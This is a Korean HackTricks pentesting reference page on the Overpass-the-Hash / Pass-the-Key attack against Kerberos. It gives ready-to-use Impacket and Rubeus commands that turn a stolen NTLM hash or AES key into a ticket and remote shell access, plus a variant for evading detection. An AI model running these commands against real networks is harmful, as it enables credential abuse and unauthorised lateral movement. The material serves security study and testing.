# Over Pass the Hash/Pass the Key

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>을 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고**하거나 **PEASS의 최신 버전에 액세스**하거나 HackTricks를 **PDF로 다운로드**하고 싶으신가요? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 저를 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks)와 [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**에 PR을 제출하여 여러분의 해킹 기법을 공유해주세요.

</details>

## Overpass The Hash/Pass The Key (PTK)

**Overpass The Hash/Pass The Key (PTK)** 공격은 전통적인 NTLM 프로토콜이 제한되고 Kerberos 인증이 우선하는 환경에서 사용됩니다. 이 공격은 사용자의 NTLM 해시 또는 AES 키를 활용하여 Kerberos 티켓을 요청함으로써 네트워크 내의 리소스에 무단으로 액세스할 수 있게 합니다.

이 공격을 실행하기 위해 초기 단계는 대상 사용자 계정의 NTLM 해시 또는 비밀번호를 획득하는 것입니다. 이 정보를 확보한 후, 해당 계정에 대한 Ticket Granting Ticket (TGT)를 얻을 수 있어 공격자가 사용자가 권한을 가진 서비스나 기기에 액세스할 수 있게 됩니다.

다음 명령을 사용하여 이 과정을 시작할 수 있습니다:
```bash
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
AES256를 필요로 하는 시나리오의 경우, `-aesKey [AES 키]` 옵션을 사용할 수 있습니다. 또한 획득한 티켓은 smbexec.py 또는 wmiexec.py와 같은 다양한 도구와 함께 사용될 수 있어 공격의 범위를 확대할 수 있습니다.

_PyAsn1Error_ 또는 _KDC cannot find the name_과 같은 문제는 일반적으로 Impacket 라이브러리를 업데이트하거나 IP 주소 대신 호스트 이름을 사용하여 Kerberos KDC와의 호환성을 보장함으로써 해결됩니다.

Rubeus.exe를 사용한 대체 명령어 시퀀스는 이 기술의 다른 측면을 보여줍니다:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
이 방법은 **Pass the Key** 접근 방식을 반영하며, 인증 목적으로 티켓을 직접 사용하고 제어하는 데 초점을 맞춥니다. TGT 요청의 시작은 기본적으로 RC4-HMAC 사용을 나타내는 이벤트 `4768: Kerberos 인증 티켓 (TGT)이 요청되었습니다`를 트리거합니다. 그러나 현대의 Windows 시스템은 AES256을 선호합니다.

운영 보안을 준수하고 AES256을 사용하기 위해 다음 명령을 적용할 수 있습니다:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## 참고 자료

* [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

* **사이버 보안 회사**에서 일하시나요? **회사를 HackTricks에서 광고하고 싶으신가요**? 아니면 **PEASS의 최신 버전에 액세스하거나 HackTricks를 PDF로 다운로드**하고 싶으신가요? [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인해보세요!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견해보세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter**에서 저를 **팔로우**하세요 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks)와 [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**에 PR을 제출하여 여러분의 해킹 기법을 공유해주세요.

</details>
